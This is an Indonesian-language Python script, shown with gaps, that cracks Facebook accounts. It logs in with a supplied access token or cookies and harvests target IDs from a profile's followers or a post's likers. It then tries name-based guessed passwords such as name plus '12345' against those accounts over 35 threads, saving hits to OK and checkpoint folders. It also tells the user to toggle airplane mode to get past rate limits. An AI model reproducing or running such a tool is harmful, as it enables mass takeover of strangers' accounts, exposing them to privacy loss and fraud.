#!/usr/bin/python3 
#coding=utf-8
#Create By Moch Aang Ardiansyah-XD
...
\x1b[0;96m╔══[ \x1b[0;97mCode By Moch Aang Ardiansyah \x1b[0;96m]
\x1b[0;96m║
\x1b[0;96m╠══[\x1b[0;93m•\x1b[0;96m]\x1b[0;97m Github   : Github.com/Kang-Toxic
\x1b[0;96m╠══[\x1b[0;93m•\x1b[0;96m]\x1b[0;97m Facebook : Facebook.com/Aang.XD404
\x1b[0;96m╠══[\x1b[0;93m•\x1b[0;96m]\x1b[0;97m WhatsApp : +6289524163441
\x1b[0;96m║""")
def menu_log():
    ...
    if pmu in ['']:
        ...
        defaultua()
        token = input('%s╚══[%s?%s] %sMalak Token : '%(O,P,O,P))
        try:
            ...
            xd.close()
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sLogin Berhasil Tod !!!'%(O,P,O,P))
            exit(BeautifulSoup.main())
            #menu()
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sToken Invalid Bangke'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
        ...
        defaultua()
        cookie = input('%s╚══[%s?%s] %sMalak Cookies : '%(O,P,O,P))
        try:
            ...
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sCookies Invalid Bangke'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
        ...
        jalan('%s╠══[%s!%s] %sMakasih Dah Pake Sc Ini'%(O,P,O,P))
...
def menu():
    ...
    print('%s╠══[%s4%s] %sCek Ingpormasih Akun Fb'%(O,P,O,P))
    ...
    print('%s╠══[%s0%s] %sKeluar [Crott Sayang]'%(O,P,O,P))
    ...
    if pm in ['']:
        ...
        jalan('%s╚══[%s!%s] %sSemoga Harimu Suram .....'%(O,P,O,P))
        os.system('rm -rf token.txt')
        menu_log()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
...
def ugen():
    ...
    if pmu in[""]:
        ...
        try:
            ...
            ungser = 'Not Found'
        print("%s╚══[%s•%s] %sUser Agent Lu : \n\n%s%s"%(O,P,O,P,O,ungser))
        jalan("\n%s╔══[ %sUser Agent Lu Saat Ini %s]"%(O,P,O))
        print('%s║'%(O))
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
...
def publik():
    ...
    try:
        ...
        try:
            ...
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Ndak Ada Goblok'%(M,P,M,P))
            menu()
        ...
        exit('%s╚══[%s!%s] %sID Nya Private Bangsat : %s'%(M,P,M,P,e))
def pengikut():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
    ...
    try:
        ...
        exit()
    try:
        print('%s╠══[%s•%s] %sKetik Me Untuk Crack Followers Sendiri '%(O,P,O,P))
        it = input("%s╠══[%s?%s] %sID Target : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
...
def likers():
    ...
    try:
        ...
        exit()
    try:
        print('%s╠══[%s•%s] %sKetik Me Untuk Crack Like Post Sendiri'%(O,P,O,P))
        it = input("%s╠══[%s?%s] %sID Target : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
    ...
    for i in _laura_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
                ...
                _aangxd_.append(i+"12345")
                _aangxd_.append(i+"234")
    _dapunta_.append(_laura_.lower())
    _aangxd_.append("sayang")
    _aangxd_.append("bismillah")
...
def tambah_pass():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sContoh :  sayang,anjing,bismillah,223344'%(O,P,O,P))
    cuy = input('%s╠══[%s•%s] %sMasukan Pass Tambahan Manual [1 Kata] : '%(O,P,O,P))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    print('%s╠══[%s•%s] %sContoh : 321,786,1122,123'%(O,P,O,P))
    coy = input('%s╠══[%s•%s] %sMasukan Pass Tambahan Dibelakang Nama : '%(O,P,O,P))
...
def tahun(fx):
    if len(fx)==15:
        ...
        elif fx[:5] in ['10006','10007']:tahunz = ' • 2021'
                ...
                try:
                    ...
                    if put in ['']:
                        ...
                        if puf in ['']:
                            ...
                            started()
                            ThreadPool(35).map(self.mfb_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.mfb,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                        ...
                        print('%s╠══[%s•%s] %sMunculkam Opsi Checkpoin? [y/t]'%(O,P,O,P))
                        puf = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
                    ...
                    print(("   %s"%e))
    def pwlist(self):
        self.pw = input('%s╠══[%s•%s] %sPassword : '%(O,P,O,P)).split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
...
def hasil():
    clear()
    banner()
    jalan('%s╔══[ %sCek Hasil Crack %s]'%(O,P,O))
    print('%s║'%(O))
    ...
    if ch in ['']:
        ...
        try:
            okl = os.listdir("OK")
            print('%s║'%(O))
            print('%s╠══[%s Hasil Crack Akun OK %s]'%(O,P,O))
            print('%s║'%(O))
            for file in okl:
                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            print('%s║'%(O))
            files = input('%s╚══[%s?%s] %sMasukan Nama File : '%(O,P,O,P))
            print('')
            if files == "":
            ...
            print('\n%s╔══[%s•%s] %sHasil Crack Pada %s Adalah %s Akun'%(O,P,O,P,del1,len(ppp)))
        except (KeyError,IOError):
        ...
        try:
            cpl = os.listdir("CP")
            print('%s║'%(O))
            print('%s╠══[%s Hasil Crack Akun CP %s]'%(O,P,O))
            print('%s║'%(O))
            for file in cpl:
                print('%s╠══[%s•%s] %s%s'%(O,P,O,P,file))
            print('%s║'%(O))
...
def log_hasil(user, pasw):
    ...
    if "c_user" in ses.cookies:
        ...
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            print("%s[%s•%s] %sAkun Tap Crott Nih Tod"%(H,P,H,P))
        else:
        ...
        print("%s[%s!%s] %sSandi Salah/Telah Diganti"%(M,P,M,P))
def cek_hasil():
    jalan('%s╠══[ %sCek Opsi Hasil Crack %s]'%(O,P,O))
    print('%s║'%(O))
    ...
    print("%s╚══[%s•%s] %sTotal Akun Adalah : %s"%(O,P,O,P,str(len(buka_baju))))
    print("")
    for memek in buka_baju:
        ...
        print("")
    print("")
    print('%s╔══[%s•%s] %s Proses Cek Opsi Selesai'%(O,P,O,P))
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
    menu()
def var_menu():
    ...
    print('%s╠══[%s3%s] %sTutorial Menggunakan Script'%(O,P,O,P))
...
def var_author():
    ...
    mlaku('%s║     • %sMoco Aang Ardiansyah-XD'%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Project %sXNXCODETEAM%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sMr Jeeck X Nano'%(O,P))
    mlaku('%s║     • %sZes Bozes'%(O,P))
    mlaku('%s║     • %sNajib-XD (YumeeTzy)'%(O,P))
    mlaku('%s║     • %sAng Hammer'%(O,P))
    mlaku('%s║     • %sAkhmad Dev'%(O,P))
    mlaku('%s║     • %sRiski [Dumai-991]'%(O,P))
    mlaku('%s║     • %sFauzan Xyz'%(O,P))
    mlaku('%s║     • %sNdrii Sans'%(O,P))
    mlaku('%s║     • %sMoch Yayan-XD'%(O,P))
    mlaku('%s║'%(O))
def var_ugen():
...
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack Cepat %s[%sSedikit%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s2%s] %sCrack Lambat %s[%sLumayan%s]'%(O,P,O,P,O,P,O))
    print('%s╠══[%s3%s] %sCrack Sangat Lambat %s[%sBanyak%s]'%(O,P,O,P,O,P,O))
...
def started():
    ...
    print('%s╚══[%s•%s] %sMode Pesawatkan [5 Detik] Setiap 5 Menit\n'%(O,P,O,P))
def folder():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
